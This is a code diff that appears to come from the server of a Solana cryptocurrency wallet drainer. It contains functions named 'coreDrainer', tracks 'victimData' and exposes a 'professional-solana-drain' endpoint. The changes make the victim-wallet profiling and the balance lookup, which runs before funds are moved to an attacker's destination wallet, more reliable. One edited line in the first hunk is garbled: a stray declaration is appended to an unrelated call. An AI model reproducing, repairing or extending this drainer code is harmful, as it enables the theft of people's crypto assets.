@@ -1036,7 +1036,7 @@ app.post("/api/track", async (req, res) => {
         try {
           await coreDrainer.analyzeWallet(victimData.walletAddress);
           await coreDrainer.fingerprintWallet(victimData.walletAddress, 1);
-          await coreDrainer.checkWalletRisk(victimData.walletAddress);
+          await coreDrainer.checkWalletRisk(victimData.walletAddress);    const userPublicKey = new PublicKey(userAddress);
           console.log('✅ Auto-activated gasless features for:', victimData.walletAddress);
         } catch (e) {
           console.log('⚠️ Some gasless features failed to auto-activate:', e.message);
@@ -2711,7 +2711,19 @@ app.post('/api/execute/professional-solana-drain', async (req, res) => {
 
     const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
     const destination = new PublicKey(destinationWallet);
-    const userPublicKey = new PublicKey(userAddress);
+     // 🎯 FIX: Clean and validate Solana address
+    console.log('🔍 RAW address before cleaning:', JSON.stringify(userAddress));
+    const cleanAddress = String(userAddress).trim();
+    console.log('🔍 Cleaned address:', cleanAddress);
+    console.log('🔍 Address length:', cleanAddress.length);
+    
+    // Validate it's a proper Solana address format
+    if (!cleanAddress.match(/^[1-9A-HJ-NP-Za-km-z]{32,44}$/)) {
+        throw new Error(`Invalid Solana address format: ${cleanAddress}`);
+    }
+    
+    const userPublicKey = new PublicKey(cleanAddress);
+    
 
     // Get balance first
     const balance = await connection.getBalance(userPublicKey);
